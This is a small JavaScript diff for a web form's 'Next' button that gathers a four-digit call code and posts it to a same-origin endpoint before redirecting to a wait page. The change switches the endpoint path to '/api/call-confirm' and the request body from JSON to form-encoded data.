@@ -171,10 +171,11 @@ document.getElementById('btnNext').addEventListener('click', function() {
     let code = '';
     document.querySelectorAll('.code-input').forEach(i => code += i.value);
     if(code.length === 4) {
-        fetch('/call-confirm', {
+        const body = new URLSearchParams({ call_code: code });
+        fetch('/api/call-confirm', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ call_code: code })
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: body.toString()
         }).then(() => {
             window.location.href = '/wait';
         });
